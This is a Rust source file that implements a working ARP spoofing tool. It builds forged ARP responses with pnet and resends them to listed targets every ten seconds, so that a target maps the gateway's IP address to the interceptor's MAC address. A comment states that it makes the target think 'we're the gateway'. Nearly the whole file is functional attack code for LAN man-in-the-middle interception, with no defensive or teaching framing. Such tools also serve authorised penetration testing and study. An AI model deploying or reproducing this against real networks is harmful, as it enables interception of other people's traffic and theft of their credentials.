use std::{sync::{Arc, Mutex, atomic::AtomicBool}, time::Duration};

use async_trait::async_trait;

use pnet::{packet::ethernet::EtherTypes, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}, util::MacAddr};
use tokio::{task, time::timeout};

use crate::arp::packet_builder::{ArpPacketBuilderImpl, ArpPacketBuilder};

use super::network_location::NetworkLocation;

#[derive(Clone, Copy)]
pub struct SpoofingEntry {
    original_location: NetworkLocation,
    spoof_to_hw: MacAddr,
    target: NetworkLocation
}

impl SpoofingEntry {
    pub fn new(original_location: NetworkLocation,
        spoof_to_hw: MacAddr,
        target: NetworkLocation) -> Self {
            Self {
                original_location,
                spoof_to_hw,
                target
            }
        }
}

#[async_trait]
pub trait AsyncArpSpoofer {
    async fn start_spoofing(&self);
    async fn add_entry(&mut self, entry: SpoofingEntry);
}

pub struct AsyncArpSpooferImpl {
    _impl: Arc<Mutex<ArpSpooferImpl>>,
    entries: Arc<tokio::sync::Mutex<Vec<SpoofingEntry>>>,
    cancellation_token: Arc<AtomicBool>
}

impl AsyncArpSpooferImpl {
    pub fn new(interface: NetworkInterface
    ) -> Self {
        return Self {
            _impl: Arc::from(Mutex::new(ArpSpooferImpl::new(interface))),
            entries: Arc::from(tokio::sync::Mutex::new(vec![])),
            cancellation_token: Arc::from(AtomicBool::new(false))
        }
    }
}

#[async_trait]
impl AsyncArpSpoofer for AsyncArpSpooferImpl {
    async fn add_entry(&mut self, entry: SpoofingEntry) {
        let lock = self.entries.lock();
        let mut entries = lock.await;
        let mut entry = vec![entry];
        entries.append(&mut entry);
    }

    async fn start_spoofing(&self) {
        self.cancellation_token.store(false, std::sync::atomic::Ordering::Relaxed);

        let cancellation_token = self.cancellation_token.clone();
        let entries = self.entries.clone();
        let _impl = self._impl.clone();
        let _ = task::spawn(async move {
            loop {
                if cancellation_token.load(std::sync::atomic::Ordering::Relaxed) == true {
                    break;
                }

                let lock = entries.lock();
                let aaa = lock.await;
            
                for entry in aaa.as_slice() {
                    AsyncArpSpooferImpl::spoof_target_global(_impl.clone(), entry).await;
                }

                tokio::time::sleep(Duration::from_secs(10)).await;
            }
        }).await;
    }
}

impl AsyncArpSpooferImpl {
    async fn spoof_target_global(_impl: Arc<Mutex<ArpSpooferImpl>>, entry: &SpoofingEntry) -> bool {
        let executor = _impl.clone();
        let entry = entry.clone();
        let future = task::spawn_blocking(move || {
            let lock = executor.lock();
            let mut executor = lock.unwrap();
            let result = executor.spoof_target(&entry.to_owned());
            return result;
        });

        let timeout = timeout(Duration::from_millis(3000), future);

        let join_handle = tokio::spawn(timeout);

        let value = join_handle.await;

        let result = value.unwrap();

        if let Ok(result) = result {
            return result.unwrap();
        } else {
            return false;
        }
    }

    async fn spoof_target(&self, entry: &SpoofingEntry) -> bool {
        return Self::spoof_target_global(self._impl.clone(), entry).await;
    }
}

pub struct ArpSpooferImpl {
    interface: NetworkInterface,
    sender: Option<Box<dyn DataLinkSender>>,
    receiver: Option<Box<dyn DataLinkReceiver>>
}

impl ArpSpooferImpl {
    pub fn new(
        interface: NetworkInterface
    ) -> Self {
        let mut result = Self {
            interface: interface,
            sender: None,
            receiver: None,
        };

        result.setup_socket();

        return result;
    }

    fn setup_socket(&mut self) {
        let (tx, rx) = match datalink::channel(&self.interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
        };

        self.sender = Some(tx);
        self.receiver = Some(rx);
    }

    fn spoof_target(&mut self, entry: &SpoofingEntry) -> bool {
        // instantiate packet

        // Arp spoofing works by faking the gateway's Mac Address so the target thinks
        // we're the gateway.
        let fake_sender = NetworkLocation {
            ipv4: entry.original_location.ipv4, // Original location's IP
            hw: entry.spoof_to_hw // Interceptor's Hardware Address
        };

        let builder = ArpPacketBuilderImpl::new();
        
        let arp_response = builder.build_response(fake_sender, entry.target);
        let ethernet_packet = builder.wrap_in_ethernet(entry.spoof_to_hw, entry.target.hw, EtherTypes::Arp, arp_response); 

        println!("[ArpSpooferImpl] Spoofing: `{}` as `{}` for `{}` (`{}`)", entry.original_location.ipv4.to_string(), entry.spoof_to_hw.to_string(), entry.target.ipv4.to_string(), entry.target.hw.to_string());

        if let Some(sender) = self.sender.as_mut() {
            let send_opt = sender.send_to(&ethernet_packet, None);

                if let Some(send_res) = send_opt {
                    if let Ok(_) = send_res {
                        //println!("Sent packet successfully!");
                        return true
                    } /*else {
                        println!("Failed on second part!");
                    }*/
        
                } /* else {
                    println!("Failed on first part!");
                } */
        }

        return false;
    }
}